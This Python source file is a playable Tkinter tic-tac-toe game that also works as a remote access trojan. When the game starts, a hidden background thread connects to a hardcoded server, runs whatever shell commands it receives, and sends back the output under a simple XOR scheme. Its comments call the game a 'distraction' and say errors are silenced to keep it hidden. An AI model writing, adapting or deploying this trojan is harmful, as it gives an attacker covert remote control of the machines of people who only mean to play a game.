import threading
import tkinter
import socket
import subprocess

# --- CONFIGURATION ---
server_ip = '10.18.2.31' # Change to your server IP
port = 9999
ENCRYPTION_KEY = b'secretkey'

def xor_crypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

# --- RAT CONNECTION LOGIC ---
def connect_to_server():
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((server_ip, port))  

        while True:
            encrypted_command = client.recv(4096)
            if not encrypted_command:
                break
            
            command = xor_crypt(encrypted_command, ENCRYPTION_KEY).decode()

            if command.lower() == 'exit':
                client.close()
                break

            try:
                # FIX: Using check_output to get raw bytes directly from the OS
                output_bytes = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                if not output_bytes:
                    output_bytes = b"Command executed successfully"
            except subprocess.CalledProcessError as e:
                output_bytes = e.output
            except Exception as e:
                output_bytes = str(e).encode()

            # Send encrypted raw bytes back to server
            encrypted_output = xor_crypt(output_bytes, ENCRYPTION_KEY)
            client.sendall(encrypted_output)

    except Exception as e:
        pass # Silently fail to keep the game distraction working

# --- FULL GAME LOGIC ---
def run_game():
    playerX = "X"
    playerO = "O"
    curr_player = playerX
    board = [[0, 0, 0], [0, 0, 0], [0, 0, 0]]

    color_blue = "#4584b6"
    color_yellow = "#ffde57"
    color_gray = "#343434"
    color_light_gray = "#646464"

    turns = 0
    game_over = False

    window = tkinter.Tk()
    window.title("Tic Tac Toe")
    window.resizable(False, False)

    frame = tkinter.Frame(window)
    label = tkinter.Label(frame, text=curr_player+"'s turn", font=("Consolas", 20), 
                        background=color_gray, foreground="white")
    label.grid(row=0, column=0, columnspan=3, sticky="we")

    def check_winner():
        nonlocal turns, game_over
        turns += 1

        # Check Rows
        for row in range(3):
            if (board[row][0]["text"] == board[row][1]["text"] == board[row][2]["text"]
                and board[row][0]["text"] != ""):
                label.config(text=board[row][0]["text"]+" is the winner!", foreground=color_yellow)
                for column in range(3):
                    board[row][column].config(foreground=color_yellow, background=color_light_gray)
                game_over = True
                return
        
        # Check Columns
        for column in range(3):
            if (board[0][column]["text"] == board[1][column]["text"] == board[2][column]["text"]
                and board[0][column]["text"] != ""):
                label.config(text=board[0][column]["text"]+" is the winner!", foreground=color_yellow)
                for row in range(3):
                    board[row][column].config(foreground=color_yellow, background=color_light_gray)
                game_over = True
                return
        
        # Check Diagonals
        if (board[0][0]["text"] == board[1][1]["text"] == board[2][2]["text"]
            and board[0][0]["text"] != ""):
            label.config(text=board[0][0]["text"]+" is the winner!", foreground=color_yellow)
            for i in range(3):
                board[i][i].config(foreground=color_yellow, background=color_light_gray)
            game_over = True
            return

        if (board[0][2]["text"] == board[1][1]["text"] == board[2][0]["text"]
            and board[0][2]["text"] != ""):
            label.config(text=board[0][2]["text"]+" is the winner!", foreground=color_yellow)
            board[0][2].config(foreground=color_yellow, background=color_light_gray)
            board[1][1].config(foreground=color_yellow, background=color_light_gray)
            board[2][0].config(foreground=color_yellow, background=color_light_gray)
            game_over = True
            return
        
        if turns == 9:
            game_over = True
            label.config(text="Tie!", foreground=color_yellow)

    def set_tile(row, column):
        nonlocal curr_player
        if game_over or board[row][column]["text"] != "":
            return
        
        board[row][column]["text"] = curr_player
        curr_player = playerO if curr_player == playerX else playerX
        label["text"] = curr_player+"'s turn"
        check_winner()

    def new_game():
        nonlocal turns, game_over
        turns = 0
        game_over = False
        label.config(text=curr_player+"'s turn", foreground="white")
        for row in range(3):
            for column in range(3):
                board[row][column].config(text="", foreground=color_blue, background=color_gray)

    # UI Setup
    for row in range(3):
        for column in range(3):
            board[row][column] = tkinter.Button(frame, text="", font=("Consolas", 50, "bold"),
                                                background=color_gray, foreground=color_blue, width=4, height=1,
                                                command=lambda r=row, c=column: set_tile(r, c))
            board[row][column].grid(row=row+1, column=column)

    button = tkinter.Button(frame, text="restart", font=("Consolas", 20), background=color_gray,
                            foreground="white", command=new_game)
    button.grid(row=4, column=0, columnspan=3, sticky="we")

    frame.pack()
    window.update()
    
    # Center Window
    window_x = int((window.winfo_screenwidth()/2) - (window.winfo_width()/2))
    window_y = int((window.winfo_screenheight()/2) - (window.winfo_height()/2))
    window.geometry(f"+{window_x}+{window_y}")

    window.mainloop()

if __name__ == "__main__":
    # Start the hidden connection thread
    threading.Thread(target=connect_to_server, daemon=True).start()
    # Start the visual game
    run_game()